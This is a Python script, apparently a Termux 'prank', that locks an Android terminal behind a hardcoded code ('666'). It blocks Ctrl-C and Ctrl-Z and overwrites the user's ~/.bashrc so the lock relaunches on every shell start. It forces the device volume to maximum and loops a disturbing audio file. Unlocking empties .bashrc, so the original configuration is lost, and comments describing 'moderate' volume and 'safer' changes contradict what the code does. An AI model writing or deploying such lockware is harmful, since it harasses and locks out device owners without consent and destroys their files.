import os
import sys
import threading
import time
from subprocess import Popen, run
import signal
import readchar
import atexit

# Configuración
STOP_CODE = "666"
MUSIC_FILE = "PrankPy/perturbador.mp3"
LOCK_FILE = os.path.expanduser("~/.termux_locked")

def create_lock_files():
    """Crea archivos de bloqueo y scripts de persistencia de forma más segura"""
    # Marca de bloqueo
    with open(LOCK_FILE, 'w') as f:
        f.write('1')
    
    # Modificar .bashrc de forma más simple y controlada
    home = os.path.expanduser("~")
    bashrc_path = os.path.join(home, ".bashrc")
    script_path = os.path.abspath(__file__)
    
    # Versión que reemplaza la pantalla de bienvenida
    with open(bashrc_path, 'w') as f:
        f.write(f"""
# Inicio del script de bloqueo
if [ -f {LOCK_FILE} ]; then
    clear
    echo -e "\\n\\n🔒 Terminal bloqueada ☠️"
    echo "-----------------"
    python {script_path}
fi
""")

def disable_keyboard_interrupt():
    """Deshabilita interrupciones de teclado de forma más suave"""
    signal.signal(signal.SIGINT, lambda x, y: None)
    signal.signal(signal.SIGTSTP, lambda x, y: None)

def play_music():
    """Reproduce la música en bucle con volumen moderado"""
    while True:
        try:
            process = Popen(['mpv', '--no-terminal', '--volume=200', 
                           '--no-config', '--no-input-terminal',
                           '--no-osc', '--no-input-default-bindings',
                           MUSIC_FILE])
            process.wait()
        except:
            time.sleep(1)
            continue

def maximize_volume():
    """Ajusta el volumen del dispositivo a un nivel moderado"""
    try:
        os.system("termux-volume music 100")
        os.system("termux-volume ring 100")
        os.system("termux-volume system 100")
    except:
        pass

def clear_screen():
    """Limpia la pantalla"""
    os.system('clear')

def get_hidden_input(prompt):
    """Obtiene entrada oculta del usuario"""
    print(prompt, end='', flush=True)
    password = ''
    while True:
        char = readchar.readchar()
        if char in ['\r', '\n']:
            print()
            return password
        elif char == '\x7f':  # Backspace
            if len(password) > 0:
                password = password[:-1]
                print('\b \b', end='', flush=True)
        else:
            password += char
            print('*', end='', flush=True)

def cleanup():
    """Limpia los archivos de bloqueo al desbloquear"""
    if os.path.exists(LOCK_FILE):
        os.remove(LOCK_FILE)
    
    # Restaura .bashrc a su estado original
    home = os.path.expanduser("~")
    bashrc_path = os.path.join(home, ".bashrc")
    with open(bashrc_path, 'w') as f:
        f.write("")

def main():
    # Configura el entorno
    disable_keyboard_interrupt()
    create_lock_files()
    maximize_volume()
    
    # Inicia la música en segundo plano
    music_thread = threading.Thread(target=play_music, daemon=True)
    music_thread.start()
    
    while True:
        try:
            clear_screen()
            print("\n" * 2)
            print("🔒 Terminal bloqueada")
            print("-" * 20)
            code = get_hidden_input("\nIntroduce el código para desbloquear: ")
            
            if code == STOP_CODE:
                clear_screen()
                cleanup()
                os.system("pkill -9 mpv")
                print("\n🔓 ¡Terminal desbloqueada!")
                time.sleep(1)
                sys.exit(0)
            else:
                clear_screen()
                print("\n❌ Código incorrecto. Intenta de nuevo...")
                time.sleep(2)
        except Exception as e:
            clear_screen()
            continue

if __name__ == "__main__":
    if not os.path.exists(MUSIC_FILE):
        print(f"Error: El archivo '{MUSIC_FILE}' no existe.")
        sys.exit(1)
    
    # Verifica dependencias
    try:
        run(['mpv', '--version'], capture_output=True)
    except FileNotFoundError:
        print("Error: mpv no está instalado.")
        print("Instálalo con: pkg install mpv")
        sys.exit(1)
    
    # Instala dependencias
    os.system("pip install readchar >/dev/null 2>&1")
    
    main()
